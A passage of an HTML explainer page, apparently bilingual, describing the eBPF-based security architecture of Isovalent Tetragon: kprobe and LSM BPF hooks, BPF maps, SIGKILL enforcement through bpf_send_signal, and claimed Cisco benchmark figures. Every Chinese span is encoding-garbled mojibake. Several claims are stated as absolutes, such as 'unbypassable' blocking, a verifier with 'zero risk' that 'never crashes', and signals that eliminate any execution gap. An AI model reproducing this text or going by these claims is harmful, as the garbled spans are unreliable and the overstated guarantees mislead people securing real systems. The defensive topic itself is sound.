                    <span lang="zh">è¯·è§‚å¯Ÿæ•°æ®æ˜¯å¦‚ä½•ä»<b>ç”¨æˆ·æ€è¯·æ±‚</b>è¿›å…¥<b>å†…æ ¸é’©å­</b>ï¼Œå¹¶åœ¨<b>ç­–ç•¥å¼•æ“</b>çš„åˆ¤æ–­ä¸‹è§¦å‘<b>å®æ—¶ SIGKILL</b>
                        çš„ã€‚è¿™ä¸ªé—­ç¯åœ¨å¾®ç§’å†…å®Œæˆï¼Œä¸ç»è¿‡å¤æ‚çš„åº”ç”¨å †æ ˆã€‚</span>
                    <span lang="en">Observe how data flows from <b>user-space requests</b> into <b>kernel hooks</b>,
                        triggering <b>real-time SIGKILL</b> via the <b>policy engine</b>. This loop completes in
                        microseconds, bypassing complex application stacks.</span>
                </p>

<div class="svg-scroll-wrapper">
    <svg width="800" height="450" viewBox="0 0 800 450" class="arch-logic-svg" xmlns="http://www.w3.org/2000/svg">
        <defs>
            <marker id="arrow-blue" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
                <path d="M0,0 L0,6 L9,3 z" fill="#049FD9" />
            </marker>
            <marker id="arrow-red" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
                <path d="M0,0 L0,6 L9,3 z" fill="#E2231A" />
            </marker>
            <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
                <feGaussianBlur stdDeviation="3" result="blur" />
                <feComposite in="SourceGraphic" in2="blur" operator="over" />
            </filter>
        </defs>

        <rect x="50" y="20" width="700" height="100" rx="8" fill="#F0F8FC" stroke="#049FD9" stroke-width="2" stroke-dasharray="5,5" />
        <text x="65" y="45" font-weight="bold" fill="#0D274D">
            <tspan lang="zh">User Space (ç”¨æˆ·ç©ºé—´)</tspan><tspan lang="en">User Space</tspan>
        </text>

        <circle cx="200" cy="70" r="25" fill="white" stroke="#049FD9" stroke-width="2" />
        <text x="200" y="74" text-anchor="middle" font-size="12" fill="#049FD9">App</text>

        <rect x="580" y="40" width="140" height="60" rx="4" fill="#6ABF4B" fill-opacity="0.1" stroke="#6ABF4B" />
        <text x="650" y="65" text-anchor="middle" font-size="10" font-weight="bold" fill="#2E7D32">K8s Metadata Cache</text>
        <text x="650" y="80" text-anchor="middle" font-size="9" fill="#2E7D32">(Pod/NS Labels)</text>

        <rect x="50" y="160" width="700" height="260" rx="8" fill="#0D274D" />
        <text x="65" y="185" font-weight="bold" fill="white">
            <tspan lang="zh">Kernel Space (å†…æ ¸ç©ºé—´)</tspan><tspan lang="en">Kernel Space</tspan>
        </text>

        <line x1="200" y1="95" x2="200" y2="200" stroke="#049FD9" stroke-width="3" marker-end="url(#arrow-blue)" />
        <text x="210" y="145" fill="#58585B" font-size="12">1. Syscall Entry</text>

        <rect x="120" y="210" width="160" height="60" rx="4" fill="#005073" stroke="#049FD9" stroke-width="2" />
        <text x="200" y="235" text-anchor="middle" fill="white" font-weight="bold">kprobe Hook</text>
        <text x="200" y="255" text-anchor="middle" fill="#049FD9" font-size="11" font-weight="bold">
            <tspan lang="zh">ã€è§‚æµ‹ï¼šæ”¶é›†ä¸Šä¸‹æ–‡ã€‘</tspan><tspan lang="en">[Observation: Context]</tspan>
        </text>

        <rect x="340" y="145" width="100" height="30" rx="15" fill="#F58025" fill-opacity="0.2" stroke="#F58025" stroke-dasharray="2" />
        <text x="390" y="165" text-anchor="middle" fill="#F58025" font-size="10" font-weight="bold">eBPF Maps</text>
        <path d="M 390 175 L 390 210" stroke="#F58025" stroke-width="1" stroke-dasharray="2" marker-end="url(#arrow-blue)" />

        <path d="M 280 240 L 380 240" stroke="#049FD9" stroke-width="2" stroke-dasharray="4" />
        <rect x="380" y="210" width="180" height="140" rx="4" fill="#6CC24A" />
        <text x="470" y="270" text-anchor="middle" fill="#0D274D" font-weight="bold" font-size="16">Policy Engine</text>

        <rect x="120" y="320" width="160" height="60" rx="4" fill="#E2231A" filter="url(#glow)" />
        <text x="200" y="345" text-anchor="middle" fill="white" font-weight="bold">LSM BPF Hook</text>
        <text x="200" y="365" text-anchor="middle" fill="#FFDADA" font-size="11" font-weight="bold">
            <tspan lang="zh">ã€é˜»æ–­ï¼šä¸å¯ç»•è¿‡ã€‘</tspan><tspan lang="en">[Enforcement: Unbypassable]</tspan>
        </text>

        <line x1="200" y1="270" x2="200" y2="320" stroke="#E2231A" stroke-width="3" marker-end="url(#arrow-red)" />
        <path d="M 380 340 L 280 340" stroke="#E2231A" stroke-width="2" stroke-dasharray="4" />
        <rect x="580" y="320" width="100" height="60" rx="4" fill="#E2231A" />
        <text x="630" y="355" text-anchor="middle" fill="white" font-weight="bold">SIGKILL</text>
        <path d="M 280 350 Q 450 400 630 380" fill="none" stroke="#E2231A" stroke-width="2" marker-end="url(#arrow-red)" />
    </svg>
</div>
            </div>
            <div class="container" style="margin-top: 80px;">
        <div class="section-header" style="margin-top: 60px;">
            <h3 style="margin-bottom: 30px;">
                <span lang="zh">æ¶æ„è®¾è®¡ï¼šæ™ºèƒ½ä¼ æ„Ÿå™¨ä¸æŒ‡æŒ¥ä¸­å¿ƒ</span>
                <span lang="en">Architecture: Smart Sensors & Command Center</span>
            </h3>
            <p>
                <span lang="zh">Isovalent Tetragon æ˜¯ä¸€ä¸ªä¸“ä¸º Kubernetes è®¾è®¡çš„åŸºäº eBPF çš„å®‰å…¨å¯è§‚æµ‹æ€§å·¥å…·ã€‚å…¶æ¶æ„å¼ºè°ƒ<b>å†…æ ¸ä¼˜å…ˆ
                        (kernel-first)</b> åŸåˆ™ï¼Œé‡‡ç”¨æ•°æ®å¹³é¢ä¸æ§åˆ¶å¹³é¢åˆ†ç¦»çš„å…ˆè¿›æ¶æ„ï¼Œå°†å®‰å…¨é˜²å¾¡çš„é‡å¿ƒä¸‹æ²‰è‡³ Linux å†…æ ¸ï¼Œä»¥å®ç°äºšæ¯«ç§’çº§çš„é˜²å¾¡ã€‚ä¸‹é¢è¯¦ç»†è¯´æ˜å…¶åˆ†å±‚å·¥ä½œæ¨¡å¼ï¼š</span><span
                    lang="en">Isovalent Tetragon is an eBPF-based security observability tool designed
                    specifically for Kubernetes. Its architecture emphasizes the <b>kernel-first</b> principle, employs an advanced decoupled architecture,
                    embedding core logic into the kernel to achieve sub-millisecond defense. Below is a detailed
                    description of its layered operational model:</span>
            </p>
        </div>

        <div class="arch-split-container">
            <div class="arch-col kernel">
                <h4>
                    <div class="node-icon" style="background: var(--cisco-midnight); display: inline-flex; width: 32px; height: 32px; align-items: center; justify-content: center; border-radius: 6px; margin-right: 12px; color: white; font-weight: bold;">S</div>
                    <span lang="zh">å†…æ ¸æ€ï¼šæ™ºèƒ½ä¼ æ„Ÿå™¨</span><span lang="en">Kernel: Smart Sensors</span>
                </h4>
                <p style="font-size: 0.95rem; color: var(--cisco-slate); margin-top: 15px;">
                    <span lang="zh">Tetragon çš„ eBPF ç¨‹åºä½œä¸º<b>â€œå†…æ ¸å†…ç½®å«å£«â€ç›´æ¥æ¤å…¥å†…æ ¸æ‰§è¡Œè·¯å¾„ï¼Œéµå¾ªâ€œå†…æ ¸ä¼˜å…ˆâ€ (Kernel-First)</b> åŸåˆ™ä»¥å®ç°äºšæ¯«ç§’çº§çš„é˜²å¾¡ã€‚</span>
                </p>
                <ul class="arch-list">
                    <li>
                        <strong><span lang="zh">é«˜æ•ˆè¿‡æ»¤ï¼š</span><span lang="en">Efficient Filtering:</span></strong>
                        <span lang="zh">æ—¢ç„¶ 90% çš„è¿‡æ»¤å‘ç”Ÿåœ¨å†…æ ¸æ€ï¼Œä¼ æ„Ÿå™¨åˆ©ç”¨ <b>kprobes</b>ï¼ˆç›‘æ§ execveï¼‰ã€<b>tracepoints</b>ï¼ˆæ•è·è°ƒåº¦å™¨äº‹ä»¶ï¼‰å’Œ <b>LSM BPF</b>ï¼ˆé˜»æ–­æ•æ„Ÿæ–‡ä»¶è®¿é—®ï¼‰ç›´æ¥è§‚å¯Ÿç³»ç»Ÿï¼Œä»…å°†åŒ¹é…ç­–ç•¥çš„â€œé«˜ä»·å€¼ä¿¡å·â€æ¨é€åˆ°ç”¨æˆ·æ€ã€‚è¿™ç§æœºåˆ¶æ¶ˆé™¤äº†æ˜‚è´µçš„è¾¹ç•Œè·¨è¶Šå¼€é”€ã€‚</span>
                    </li>
                    <li>
                        <strong><span lang="zh">ç­–ç•¥æœ¬åœ°åŒ–ï¼š</span><span lang="en">Localized Policy:</span></strong>
                        <span lang="zh">å®‰å…¨ç­–ç•¥ï¼ˆTracingPolicyï¼‰è¢«åŠ è½½è‡³å†…æ ¸ <b>BPF Maps</b> ä¸­ã€‚å†…æ ¸ç¨‹åºåˆ©ç”¨è¿™äº›åŸå­æ€§çŠ¶æ€å­˜å‚¨è¡¨ç»´æŠ¤ä¸´æ—¶çŠ¶æ€ï¼Œå³ä½¿åœ¨æé«˜æ€§èƒ½å‹åŠ›ä¸‹ä¹Ÿèƒ½ç¡®ä¿å®¡è®¡ä¸€è‡´æ€§ï¼Œå¹¶å®ç°æ¯«ç§’çº§çš„é€»è¾‘åˆ¤æ–­ã€‚</span>
                    </li>
                    <li>
                        <strong><span lang="zh">ç«‹å³é˜»æ–­ï¼š</span><span lang="en">Immediate Enforcement:</span></strong>
                        <span lang="zh">è¿™æ˜¯çœŸæ­£çš„<b>â€œåŒæ­¥é˜»æ–­â€</b>æœºåˆ¶ã€‚åˆ©ç”¨ <code>bpf_send_signal</code> è¾…åŠ©å‡½æ•°ï¼Œåœ¨æ¶æ„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚éæ³•å†™æ–‡ä»¶ã€ç‰¹æƒæå‡ï¼‰å®Œæˆä¹‹å‰ï¼Œç›´æ¥åœ¨å†…æ ¸ä¸Šä¸‹æ–‡è§¦å‘ <b>SIGKILL</b> ä¿¡å·ç»ˆæ­¢è¿›ç¨‹ï¼Œç‰©ç†ä¸Šæœç»äº†åˆ©ç”¨æ—¶é—´å·®ç»•è¿‡çš„ <b>TOCTOU</b>ï¼ˆæ£€æŸ¥ä¸ä½¿ç”¨æ—¶é—´ï¼‰æ”»å‡»ã€‚</span>
                    </li>
                </ul>
            </div>

            <div class="arch-col user">
                <h4>
                    <div class="node-icon" style="background: var(--cisco-blue); display: inline-flex; width: 32px; height: 32px; align-items: center; justify-content: center; border-radius: 6px; margin-right: 12px; color: white; font-weight: bold;">C</div>
                    <span lang="zh">ç”¨æˆ·æ€ï¼šæŒ‡æŒ¥ä¸­å¿ƒ</span><span lang="en">User: Command Center</span>
                </h4>
                <p style="font-size: 0.95rem; color: var(--cisco-slate); margin-top: 15px;">
                    <span lang="zh">Tetragon Agent é€šå¸¸ä»¥ <b>DaemonSet</b> å½¢å¼è¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´ï¼Œå……å½“å¤§è„‘è§’è‰²ï¼Œè´Ÿè´£å¤æ‚çš„é€»è¾‘ç®¡ç†ã€å…ƒæ•°æ®ç¼–æ’ä¸ç”Ÿæ€é›†æˆã€‚</span>
                </p>
                <ul class="arch-list">
                    <li>
                        <strong><span lang="zh">èº«ä»½å…³è”ï¼š</span><span lang="en">Identity Association:</span></strong>
                        <span lang="zh">å®æ—¶è®¢é˜… Kubernetes APIï¼Œåˆ©ç”¨å†…æ ¸ä¸­çš„ Cgroup ä¿¡æ¯åœ¨æ¯«ç§’çº§å°†åº•å±‚ PID æ˜ å°„ä¸º <b>Pod æ ‡ç­¾ã€Namespace åŠæœåŠ¡èº«ä»½</b>ã€‚ç¡®ä¿å³ä½¿åœ¨åŠ¨æ€åŸºç¡€è®¾æ–½ä¸­ï¼Œå®‰å…¨äº‹ä»¶ä¾ç„¶å…·æœ‰æ¸…æ™°çš„ä¸Šä¸‹æ–‡èº«ä»½ã€‚</span>
                    </li>
                    <li>
                        <strong><span lang="zh">ç­–ç•¥ç¼–æ’ï¼š</span><span lang="en">Policy Orchestration:</span></strong>
                        <span lang="zh">å°† YAML å£°æ˜å¼ç­–ç•¥ç¿»è¯‘æˆå†…æ ¸å­—èŠ‚ç ã€‚åœ¨åˆ†å‘å‰ï¼Œ<b>Verifierï¼ˆéªŒè¯å™¨ï¼‰</b>ä¼šå¯¹ç­–ç•¥è¿›è¡Œä¸¥æ ¼çš„é™æ€å®‰å…¨åˆ†æï¼Œç¡®ä¿å…¶å†…å­˜å®‰å…¨ã€æ— æ­»å¾ªç¯ä¸”æ°¸ä¸å¼•å‘å†…æ ¸å´©æºƒï¼ˆPanicï¼‰ï¼Œä¿è¯äº†ç”Ÿäº§ç¯å¢ƒçš„ç»å¯¹ç¨³å®šã€‚</span>
                    </li>
                    <li>
                        <strong><span lang="zh">ç»“æ„åŒ–è¾“å‡ºï¼š</span><span lang="en">Structured Output:</span></strong>
                        <span lang="zh">é€šè¿‡ gRPC æµã€é€‚é… SIEM çš„ <b>JSON Logs</b>ï¼ˆå«å®Œæ•´å‚æ•°ã€Pod æ ‡ç­¾ã€å®¹å™¨é•œåƒæŒ‡çº¹ï¼‰æˆ– Prometheus æŒ‡æ ‡å¯¼å‡ºé¥æµ‹æ•°æ®ã€‚è¿™ä½¿å¾—é«˜çº§è¡Œä¸ºåˆ†æèƒ½å¤Ÿç”Ÿæˆé«˜ä¼˜å…ˆçº§è­¦æŠ¥ã€‚</span>
                    </li>
                </ul>
            </div>
        </div>

        <div class="coordination-banner" style="margin-top: 40px; border-left: 5px solid var(--cisco-orange); background: rgba(245, 128, 37, 0.05); padding: 30px; border-radius: var(--radius-lg);">
            <h4 style="color: var(--cisco-midnight); margin-bottom: 15px; font-size: 1.25rem;">
                <span lang="zh">ååŒæœºåˆ¶ï¼šBPF Maps ä¸ Ring Buffer</span>
                <span lang="en">Synergy: BPF Maps & Ring Buffer</span>
            </h4>
            <p style="font-size: 1rem; line-height: 1.7;">
                <span lang="zh">â€œä¼ æ„Ÿå™¨â€ä¸â€œæŒ‡æŒ¥ä¸­å¿ƒâ€é€šè¿‡é«˜æ•ˆçš„ <b>BPF Maps</b> å’Œ <b>Ring Buffer</b> é€šä¿¡ç®¡é“å®ç°æ•°æ®å¹³é¢ä¸æ§åˆ¶å¹³é¢çš„å®Œç¾è§£è€¦ã€‚</span>
            </p>
            <ul style="list-style: none; margin-top: 15px; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
                <li style="font-size: 0.9rem; color: var(--cisco-slate);">
                    <strong style="color: var(--cisco-orange);">[ <span lang="zh">äº¤äº’åé¦ˆ</span> ]</strong><br>
                    <span lang="zh">ç”¨æˆ·æ€è´Ÿè´£â€œä¸‹å‘ç­–ç•¥ä¸èº«ä»½å­—å…¸â€ï¼Œå†…æ ¸æ€è´Ÿè´£â€œè¯»å–å¹¶æ‰§è¡Œæ‰§æ³•â€ã€‚</span>
                </li>
                <li style="font-size: 0.9rem; color: var(--cisco-slate);">
                    <strong style="color: var(--cisco-orange);">[ <span lang="zh">æ•°æ®æµå‘</span> ]</strong><br>
                    <span lang="zh">å†…æ ¸åˆ©ç”¨ <b>Perf Ring Buffer</b> å°†è¿‡æ»¤åçš„äº‹ä»¶æ¨é€åˆ°ç”¨æˆ·æ€ï¼›åœ¨é«˜æµåœºæ™¯ä¸‹ï¼Œè¿™ç§â€œæŒ‰éœ€ä¸ŠæŠ¥â€æ¨¡å¼æå¤§åœ°ä¼˜åŒ–äº†ç³»ç»Ÿèµ„æºä½¿ç”¨ã€‚</span>
                </li>
                <li style="font-size: 0.9rem; color: var(--cisco-slate);">
                    <strong style="color: var(--cisco-orange);">[ <span lang="zh">ä¼˜åŠ¿é›†æˆ</span> ]</strong><br>
                    <span lang="zh">è¿™ç§ååŒç®¡é“ç¡®ä¿äº†æ¯ä¸ªèŠ‚ç‚¹ç‹¬ç«‹è‡ªæ²»è¿è¡Œï¼ŒåŒæ—¶ç”¨æˆ·æ€èƒ½èšåˆå…¨å±€è§†å›¾ï¼Œæä¾›ç«¯åˆ°ç«¯çš„æ·±åº¦å¯è§æ€§ã€‚</span>
                </li>
            </ul>
        </div>


<div class="protection-rings-container">
    <h4 style="margin-bottom: 15px; color: var(--cisco-midnight);">
        <span lang="zh">å†…æ ¸é˜²å¾¡å±‚çº§ (Protection Rings)</span><span lang="en">Kernel Protection Rings</span>
    </h4>
    <div class="svg-scroll-wrapper" style="border: none; background: transparent;">
        <svg width="450" height="220" viewBox="0 0 400 200" class="protection-rings-svg" preserveAspectRatio="xMidYMid meet">
            <circle cx="200" cy="180" r="160" fill="none" stroke="#E4E4E4" stroke-width="2" />
            <circle cx="200" cy="180" r="120" fill="none" stroke="#CBD5E1" stroke-width="2" />
            <circle cx="200" cy="180" r="80" fill="#0D274D" />

            <text x="200" y="50" text-anchor="middle" font-size="12" fill="#888">
                <tspan lang="zh">ç”¨æˆ·ç©ºé—´ (è„†å¼±å±‚)</tspan><tspan lang="en">User Space (Vulnerable Layer)</tspan>
            </text>
            <text x="200" y="90" text-anchor="middle" font-size="12" fill="#58585B">
                <tspan lang="zh">Kprobes (è§‚æµ‹å±‚ - é£é™©)</tspan><tspan lang="en">Kprobes (Observation - Risk)</tspan>
            </text>
            <text x="200" y="175" text-anchor="middle" font-size="12" fill="#FFFFFF" font-weight="bold">
                <tspan lang="zh">LSM (ç»ˆæé˜»æ–­å±‚ - ä¸å¯ç»•è¿‡)</tspan><tspan lang="en">LSM (Unbypassable)</tspan>
            </text>
        </svg>
    </div>
    <p style="font-size: 0.8rem; color: #888; margin-top: 10px; font-style: italic;">
        <span lang="zh">* å†…æ ¸å±‚çº§è¶Šæ·±ï¼Œé˜²å¾¡çš„ä¸å¯ç»•è¿‡æ€§ï¼ˆUnbypassabilityï¼‰è¶Šå¼º</span>
        <span lang="en">* Deeper kernel levels provide stronger unbypassability</span>
    </p>
</div>
                <div class="mechanism-card" style="margin-top: 40px; border-left: 5px solid var(--cisco-orange);">
                    <div class="case-badge" style="background: var(--cisco-orange);">
                        <span lang="zh">å†…æ ¸ä¸“å®¶æŠ€æœ¯çœ‹æ¿ (Kernel Internals Deep Dive)</span><span lang="en">Kernel Internals
                            Deep Dive</span>
                    </div>

                    <div class="grid-2x2-custom">
                        <div class="dashboard-item">
                            <strong style="color: var(--cisco-midnight); display: block; margin-bottom: 10px;">
                                <span lang="zh">bpf_send_signal æœºåˆ¶</span><span lang="en">bpf_send_signal
                                    Mechanism</span>
                            </strong>
                            <p style="font-size: 0.85rem; line-height: 1.6; color: var(--cisco-slate);">
                                <span lang="zh">è¿™æ˜¯ Tetragon å®ç°å®æ—¶é˜»æ–­çš„å…³é”®ã€‚å½“å†…æ ¸æ£€æµ‹åˆ°ç­–ç•¥è¿è§„æ—¶ï¼ŒeBPF ç¨‹åºä¼šè°ƒç”¨è¯¥ Helper
                                    å‡½æ•°ã€‚å®ƒä¸ä»…æ˜¯å‘é€ä¸€ä¸ªå¼‚æ­¥ä¿¡å·ï¼Œè€Œæ˜¯åœ¨è¯¥è¿›ç¨‹<b>è¿”å›ç”¨æˆ·æ€æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤å‰</b>ï¼Œç¡®ä¿ä¿¡å·æŒ‚è½½åˆ°è¿›ç¨‹çš„ä»»åŠ¡ç»“æ„ä½“ï¼ˆtask_structï¼‰ä¸­ã€‚è¿™ç§åŒæ­¥å±æ€§æœç»äº†ä»»ä½•â€œæ‰§è¡Œé—´éš™â€ã€‚</span><span
                                    lang="en">This is the key to Tetragon's real-time enforcement. When policy violation
                                    is detected, the eBPF program calls this Helper function. It ensures the signal is
                                    attached to the (task_struct) <b>before the process returns to user space</b>. This synchronization property eliminates any "execution gaps".</span>
                            </p>
                        </div>

                        <div class="dashboard-item">
                            <div class="dc-observer-post"
                                style="margin: 0; height: 100%; display: flex; align-items: center;">
                                <p style="font-size: 0.9rem; margin: 0; line-height: 1.6;">
                                    <strong><span lang="zh">å†³èƒœæ—¶åˆ»ï¼š</span><span lang="en">Moment of
                                            Decision:</span></strong>
                                    <span lang="zh">æ­£æ˜¯é æ­¤æœºåˆ¶ï¼ŒDark-Chain å°è¯•åˆ é™¤ <code>auth.log</code>
                                        çš„æŒ‡ä»¤è¿˜æ²¡æ¥å¾—åŠè¢«æ–‡ä»¶ç³»ç»Ÿæ‰§è¡Œï¼Œå†…æ ¸å°±ç›´æ¥ä»åº•å±‚â€œæ‹”æ‰äº†ç”µæº(SIGKILL)â€ã€‚</span><span lang="en">Thanks to this mechanism,
                                        before Dark-Chain could delete <code>auth.log</code> by the file system, the kernel simply "pulled
                                        the plug (SIGKILL)" from below.</span>
                                </p>
                            </div>
                        </div>

                        <div class="dashboard-item">
                            <strong style="color: var(--cisco-midnight); display: block; margin-bottom: 10px;">
                                <span lang="zh">å†…æ ¸æ³•å®˜ï¼šBPF Verifier</span><span lang="en">Kernel Judge: BPF
                                    Verifier</span>
                            </strong>
                            <p style="font-size: 0.85rem; line-height: 1.6; color: var(--cisco-slate);">
                                <span lang="zh">è¿›å…¥å†…æ ¸å‰çš„â€œä¸¥æ ¼å®‰æ£€â€ã€‚å®ƒåœ¨ä»£ç è¿è¡Œå‰è¿›è¡Œå½¢å¼åŒ–éªŒè¯ï¼Œç¡®ä¿ç¨‹åºï¼š</span><span lang="en">A "strict
                                    security check" before entering the kernel. It performs formal verification to
                                    ensure the program:</span>
                            </p>
                            <ul
                                style="font-size: 0.8rem; padding-left: 18px; margin-top: 8px; color: #666; line-height: 1.6;">
                                <li><span lang="zh"><b>æ°¸ä¸å®•æœº</b>ï¼šä¸¥ç¦æ— é™å¾ªç¯ï¼Œä¿è¯åœ¨å¯é¢„æµ‹æ—¶é—´å†…ç»“æŸã€‚</span><span lang="en"><b>Never
                                            Crashes</b>: No infinite loops, ensuring termination.</span></li>
                                <li><span lang="zh"><b>å†…å­˜å®‰å…¨</b>ï¼šä¸¥ç¦éæ³•è¯»å–éæˆæƒå†…å­˜åŒºåŸŸã€‚</span><span lang="en"><b>Memory
                                            Safety</b>: No unauthorized memory access.</span></li>
                                <li><span lang="zh"><b>é›¶å´©ç›˜é£é™©</b>ï¼šVerifier ä¸é€šè¿‡ï¼Œç¨‹åºæ ¹æœ¬æ— æ³•åŠ è½½ã€‚</span><span lang="en"><b>Zero
                                            Risk</b>: If verification fails, the program won't load.</span></li>
                            </ul>
                        </div>

                        <div class="dashboard-item">
                            <strong style="color: var(--cisco-midnight); display: block; margin-bottom: 10px;">
                                <span lang="zh">LSM (Linux Security Module)</span><span lang="en">LSM (Linux Security
                                    Module)</span>
                            </strong>
                            <p style="font-size: 0.85rem; line-height: 1.6; color: var(--cisco-slate);">
                                <span lang="zh">ä¸åŒäºæ—©æœŸçš„ kprobes æ‹¦æˆªï¼ˆå¯èƒ½è¢« TOCTOU ç»•è¿‡ï¼‰ï¼ŒTetragon åˆ©ç”¨äº† <b>LSM BPF</b>ã€‚LSM
                                    é’©å­ä½äºå†…æ ¸æƒé™æ£€æŸ¥çš„æœ€åº•å±‚ã€‚åªæœ‰é€šè¿‡ LSM æ£€æŸ¥çš„è¯·æ±‚æ‰èƒ½è·å¾—èµ„æºå¥æŸ„ï¼ŒTetragon æŒ‚è½½äºæ­¤ï¼Œæä¾›äº†ç‰©ç†å±‚é¢çš„ä¸å¯ç»•è¿‡æ€§ã€‚</span><span lang="en">Unlike
                                    early kprobes (vulnerable to TOCTOU), Tetragon uses <b>LSM BPF</b>. Hooks at the
                                    lowest level of permission checks ensure requests only get handles if they pass. Tetragon is hooked here
                                    providing physical unbypassability.</span>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="perf-insight-panel"
                    style="margin-top: 40px; border: 1px solid var(--cisco-platinum); padding: 30px; border-radius: 12px; background: #FFFFFF; display: flex; gap: 30px; align-items: center;">
                    <div style="flex: 1.2;">
                        <div class="case-badge" style="background: var(--cisco-midnight);">SRE Perspective</div>
                        <h3 style="margin-bottom:15px; color: var(--cisco-midnight);">
                            <span lang="zh">ä¸ºä»€ä¹ˆ Tetragon å¯¹ç”Ÿäº§ç¯å¢ƒæ˜¯å®‰å…¨çš„ï¼Ÿ</span><span lang="en">Why is Tetragon Safe for
                                Production?</span>
                        </h3>
                        <p style="font-size: 0.95rem; line-height: 1.6; color: var(--cisco-slate);">
                            <span lang="zh">ä¸åŒäºä¼ ç»Ÿçš„è¿è¡Œæ—¶å·¥å…·ï¼ŒTetragon ä¸“ä¸ºé«˜æ€§èƒ½å…³é”®ä¸šåŠ¡è®¾è®¡ã€‚eBPF çš„éªŒè¯å™¨ (Verifier)
                                ç¡®ä¿åŠ è½½çš„ç¨‹åºç»ä¸ä¼šæ­»å¾ªç¯æˆ–æŒ‚æ­»å†…æ ¸ï¼Œè€Œå†…æ ¸æ€æ‰§è¡Œè§„é¿äº†æµ·é‡çš„ CPU æŒ‡ä»¤å‘¨æœŸã€‚</span><span lang="en">Unlike traditional
                                runtime tools, Tetragon is designed for high-performance mission-critical business. The
                                eBPF Verifier ensures loaded programs never infinite loop or hang the kernel, while
                                in-kernel execution avoids massive CPU instruction cycles.</span>
                        </p>
                        <ul style="font-size: 0.9rem; padding-left: 20px; color: var(--cisco-slate); line-height: 1.8;">
                            <li>
                                <b><span lang="zh">è§„é¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼š</span><span lang="en">Avoid Context Switching:</span></b>
                                <span lang="zh">è¿‡æ»¤é€»è¾‘ç›´æ¥åœ¨å†…æ ¸æ‰§è¡Œï¼Œä»…éœ€å‘é€æå°‘é‡çš„äº‹ä»¶åˆ°ç”¨æˆ·æ€ã€‚</span><span lang="en">Filtering logic
                                    executes directly in-kernel, sending only minimal events to user-space.</span>
                            </li>
                            <li>
                                <b><span lang="zh">æ•°æ®é›¶æ‹·è´ï¼š</span><span lang="en">Zero-Copy Data:</span></b>
                                <span lang="zh">æ¢æµ‹ç‚¹ä¸ç­–ç•¥å¼•æ“å…±äº« BPF Mapsï¼Œæ— éœ€æ˜‚è´µçš„æ•°æ®åºåˆ—åŒ–ä¸å¤åˆ¶ã€‚</span><span lang="en">Probes and
                                    policy engines share BPF Maps, eliminating expensive data serialization and
                                    copying.</span>
                            </li>
                        </ul>
                    </div>

                    <div class="perf-bar-chart" style="flex: 1; display: flex; flex-direction: column; gap: 20px;">
                        <div class="perf-bar-item">
                            <div class="perf-label"
                                style="font-size: 0.8rem; margin-bottom: 6px; display: flex; justify-content: space-between;">
                                <span><span lang="zh">ä¼ ç»Ÿç”¨æˆ·æ€å®¡è®¡ (CPU æŸè€—)</span><span lang="en">Traditional User-space
                                        Auditing (CPU)</span></span>
                                <span style="font-weight: bold; color: var(--cisco-red);">High</span>
                            </div>
                            <div class="perf-track"
                                style="height: 10px; background: #F2F2F2; border-radius: 5px; overflow: hidden;">
                                <div class="perf-fill"
                                    style="width: 85%; height: 100%; background: var(--cisco-red); transition: width 1s;">
                                </div>
                            </div>
                        </div>
                        <div class="perf-bar-item">
                            <div class="perf-label"
                                style="font-size: 0.8rem; margin-bottom: 6px; display: flex; justify-content: space-between;">
                                <span><span lang="zh">Tetragon eBPF å®¡è®¡ (CPU æŸè€—)</span><span lang="en">Tetragon eBPF
                                        Auditing (CPU)</span></span>
                                <span style="font-weight: bold; color: var(--cisco-green);">Minimal (&lt;1%)</span>
                            </div>
                            <div class="perf-track"
                                style="height: 10px; background: #F2F2F2; border-radius: 5px; overflow: hidden;">
                                <div class="perf-fill"
                                    style="width: 15%; height: 100%; background: var(--cisco-green); transition: width 1s;">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mechanism-card" style="margin-top: 40px; border-left-color: var(--cisco-green);">
                    <div class="case-badge" style="background: var(--cisco-green);">
                        <span lang="zh">ç”Ÿäº§çº§æ€§èƒ½åŸºå‡† (SRE Benchmark)</span><span lang="en">Production Performance
                            Benchmark</span>
                    </div>
                    <p style="font-size: 0.95rem; margin-bottom: 25px; color: var(--cisco-slate);">
                        <span lang="zh">åŸºäºæ€ç§‘å†…éƒ¨å¤§è§„æ¨¡ Kubernetes é›†ç¾¤ï¼ˆ1000+ èŠ‚ç‚¹ï¼‰çš„å®æˆ˜æ•°æ®ï¼š</span><span lang="en">Based on
                            real-world data from Cisco's large-scale Kubernetes clusters (1000+ nodes):</span>
                    </p>

                    <div class="grid-2x2-custom">
                        <div class="dash-widget"
                            style="background: #F8FAFC; border: 1px solid var(--cisco-platinum); padding: 20px; border-radius: 8px;">
                            <div class="dash-label" style="color: #888; font-size: 0.75rem; margin-bottom: 5px;">
                                <span lang="zh">CPU èµ„æºæ¶ˆè€—</span><span lang="en">CPU Resource Consumption</span>
                            </div>
                            <div class="dash-value"
                                style="color: var(--cisco-green); font-size: 1.8rem; font-weight: bold;">
                                < 1% </div>
                                    <div style="font-size: 0.7rem; color: #58585B; margin-top: 5px;">
                                        <span lang="zh">å•æ ¸å³°å€¼è´Ÿè½½</span><span lang="en">Single-core Peak Load</span>
                                    </div>
                            </div>
                            <div class="dash-widget"
                                style="background: #F8FAFC; border: 1px solid var(--cisco-platinum); padding: 20px; border-radius: 8px;">
                                <div class="dash-label" style="color: #888; font-size: 0.75rem; margin-bottom: 5px;">
                                    <span lang="zh">å•èŠ‚ç‚¹ååé‡</span><span lang="en">Single-node Throughput</span>
                                </div>
                                <div class="dash-value"
                                    style="color: var(--cisco-midnight); font-size: 1.8rem; font-weight: bold;"> 1M+
                                </div>
                                <div style="font-size: 0.7rem; color: #58585B; margin-top: 5px;">
                                    <span lang="zh">æ¯ç§’äº‹ä»¶å¤„ç†é‡ (Events / Sec)</span><span lang="en">Events / Sec</span>
                                </div>
                            </div>
                            <div class="dash-widget"
                                style="background: #F8FAFC; border: 1px solid var(--cisco-platinum); padding: 20px; border-radius: 8px;">
                                <div class="dash-label" style="color: #888; font-size: 0.75rem; margin-bottom: 5px;">
